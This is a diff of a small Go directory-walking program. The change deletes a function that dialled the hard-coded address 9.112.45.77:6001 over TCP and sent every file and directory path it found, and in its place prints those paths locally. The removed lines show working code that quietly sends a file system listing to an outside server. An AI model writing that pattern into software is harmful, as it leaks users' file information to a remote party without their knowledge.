@@ -3,8 +3,6 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"log"
-	"net"
 	"os"
 	"time"
 )
@@ -12,13 +10,12 @@ import (
 var (
 	err  error
 	path string
-	conn net.Conn
 )
 
 func main() {
 	defer func() {
-		if err1 := recover(); err1 != nil {
-			fmt.Println(err1)
+		if err := recover(); err != nil {
+			fmt.Println(err)
 		}
 	}()
 	startTime := time.Now().UnixNano()
@@ -36,6 +33,7 @@ func main() {
 	fmt.Println(totalTime / 1000)
 }
 func CheckErr(e error) {
+
 	if e != nil {
 		panic(e)
 	}
@@ -49,19 +47,10 @@ func ListDirs(path string) {
 	}
 	for _, list := range dirlist {
 		if list.IsDir() {
-			//		fmt.Println("dir:", path+PthSep+list.Name())
+			fmt.Println("dir:", path+PthSep+list.Name())
 			ListDirs(path + PthSep + list.Name())
 		} else {
-			//		fmt.Println("file:", path+PthSep+list.Name())
+			fmt.Println("file:", path+PthSep+list.Name())
 		}
-		sendtoserver(path + PthSep + list.Name() + "\n")
 	}
-}
-func sendtoserver(name string) {
-	conn, err = net.Dial("tcp", "9.112.45.77:6001")
-	if err != nil {
-		log.Fatal(err)
-		os.Exit(1)
-	}
-	fmt.Fprintf(conn, name)
 }
